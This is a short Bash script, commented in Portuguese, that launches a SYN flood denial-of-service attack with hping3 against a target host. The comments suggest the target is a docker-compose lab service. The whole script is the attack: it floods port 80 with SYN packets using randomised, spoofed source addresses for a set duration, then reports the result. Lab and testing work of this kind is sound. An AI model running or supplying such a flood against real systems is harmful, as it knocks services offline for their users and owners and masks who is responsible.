#!/bin/bash

# Nome do host do alvo (deve ser o nome do serviço no docker-compose)
TARGET_HOST="server-target"
# Porta do serviço HTTP no alvo
TARGET_PORT="80"
# Duração do ataque em segundos
ATTACK_DURATION=${1:-10} # Usa o primeiro argumento, ou 10 segundos como padrão

echo "=========================================="
echo "Iniciando SYN Flood Attack (hping3)..."
echo "Alvo: $TARGET_HOST na porta $TARGET_PORT"
echo "Duração: $ATTACK_DURATION segundos"
echo "Comando: hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_HOST"
echo "=========================================="

# O comando hping3:
# -S: Envia apenas o flag SYN.
# -p 80: Porta de destino (80).
# --flood: Envia pacotes o mais rápido possível (não espera respostas).
# --rand-source: Mascara o IP de origem (aumenta o realismo do ataque).
# $TARGET_HOST: O alvo.

# O 'timeout' garante que o ataque pare após o tempo definido
timeout $ATTACK_DURATION hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_HOST

# Verifica o status do comando timeout
if [ $? -eq 124 ]; then
    echo "=========================================="
    echo "Ataque SYN Flood concluído após $ATTACK_DURATION segundos."
    echo "=========================================="
else
    echo "=========================================="
    echo "Ataque SYN Flood finalizado manualmente ou houve um erro."
    echo "=========================================="
fi

# Mantém o container rodando para que você possa inspecionar os logs
sleep 5